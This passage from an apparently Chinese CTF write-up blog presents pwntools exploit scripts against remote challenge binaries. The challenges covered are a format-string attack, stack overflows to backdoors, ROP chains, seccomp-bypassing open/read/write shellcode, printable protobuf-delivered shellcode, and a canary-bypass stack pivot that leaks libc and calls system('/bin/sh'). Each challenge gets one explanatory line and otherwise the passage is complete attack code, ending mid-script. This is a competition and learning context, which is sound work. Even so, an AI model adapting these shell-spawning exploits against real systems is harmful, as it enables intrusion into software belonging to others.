punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ogg2<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c%8$hn'</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4011EF</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="giaopwn"><a href="#giaopwn" class="headerlink" title="giaopwn"></a>giaopwn</h3><p>栈溢出返回到后门</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">31413</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>code <span class="token operator">=</span> <span class="token number">0x601048</span>bd <span class="token operator">=</span> <span class="token number">0x4006D2</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000400743</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bd<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'YL'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ezorw"><a href="#ezorw" class="headerlink" title="ezorw"></a>ezorw</h3><p>禁用了很多系统调用，用<code>openat</code>、<code>mmap</code>、<code>sendfile</code>代替</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">44021</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>shellcode<span class="token operator">=</span>shellcraft<span class="token punctuation">.</span>openat<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/flag'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>shellcode<span class="token operator">+=</span>shellcraft<span class="token punctuation">.</span>mmap<span class="token punctuation">(</span><span class="token number">0x10000</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'eax'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>shellcode<span class="token operator">+=</span>shellcraft<span class="token punctuation">.</span>sendfile<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'orw'</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ezstack"><a href="#ezstack" class="headerlink" title="ezstack"></a>ezstack</h3><p>字符绕过，用<code>$0</code>代替<code>sh</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">39602</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>bd <span class="token operator">=</span> <span class="token number">0x401275</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bd<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'stack'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'command'</span><span class="token punctuation">,</span> <span class="token string">b"$0\x00"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="msg-bot"><a href="#msg-bot" class="headerlink" title="msg_bot"></a>msg_bot</h3><p><code>protobuf</code>结构体逆向和可见字符<code>shellcode</code>，利用<code>32</code>位的<code>open</code>（即<code>64</code>位的<code>fstat</code>)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> bot_pb2 <span class="token keyword">import</span> Msgbot<span class="token keyword">import</span> grpccontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">21231</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''push 0x66666963pop rsixor qword ptr [rax + 0x20], rsipush rbxpop rdixor al, 0x22push raxpop rsipush 0x66666963pop rdxpush rbxpop raxpush raxpush raxpush raxpush raxpush raxpush rax\x6c\x6c\x66\x66'''</span>msgcontent <span class="token operator">=</span> <span class="token string">b'\x68\x63\x69\x66\x66\x5e\x48\x31\x70\x20\x53\x5f\x34\x22\x50\x5e\x68\x63\x69\x66\x66\x5a\x53\x58'</span> <span class="token operator">+</span> <span class="token string">b'\x50'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\x6c\x6c\x66\x66'</span>msg <span class="token operator">=</span> Msgbot<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>msgid <span class="token operator">=</span> <span class="token number">0xC0DEFEED</span>msg<span class="token punctuation">.</span>msgsize <span class="token operator">=</span> <span class="token number">0xF00DFACE</span>msg<span class="token punctuation">.</span>msgcontent <span class="token operator">=</span> msgcontentserialized <span class="token operator">=</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'botmsg'</span><span class="token punctuation">,</span> serialized<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''mov  eax, 5push ecxpop  ebxmov  dword ptr [ecx], 0x6c662f2eadd  ecx, 4mov  dword ptr [ecx], 0x6761xor ecx, ecxxor edx, edxint  0x80'''</span>shellcode <span class="token operator">=</span> <span class="token string">b"\xb8\x05\x00\x00\x00\x51\x5b\xc7\x01\x2e\x2f\x66\x6c\x83\xc1\x04\xc7\x01\x61\x67\x00\x00\x31\xc9\x31\xd2\xcd\x80"</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="round2"><a href="#round2" class="headerlink" title="round2"></a>round2</h2><h3 id="ezstack2"><a href="#ezstack2" class="headerlink" title="ezstack2"></a>ezstack2</h3><p>栈溢出设置一参为<code>0x114514</code>之后直接劫持到<code>vuln</code>函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">47708</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400823</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040056e</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x114514</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400757</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="shortshell"><a href="#shortshell" class="headerlink" title="shortshell"></a>shortshell</h3><p><code>rbx</code>里有地址，直接计算一下<code>jmp</code>过去</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">27490</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''sub bl, 0x18jmp rbx'''</span>p <span class="token operator">=</span> <span class="token string">b'\x80\xeb\x1c\xff\xe3'</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>控制<code>main</code>和<code>gift</code>的<code>rbp</code>，利用<code>gift</code>读的长度大向<code>main</code>的<code>ret</code>写</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">37134</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>stack_check_fail <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013e3</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'functions?'</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_check_fail <span class="token operator">+</span> <span class="token number">0xa00</span> <span class="token operator">-</span> <span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401296</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'functions?'</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_check_fail <span class="token operator">+</span> <span class="token number">0xa00</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401258</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401296</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'functions?'</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x404a28</span> <span class="token operator">+</span> <span class="token number">0x48</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401258</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basebin_sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token 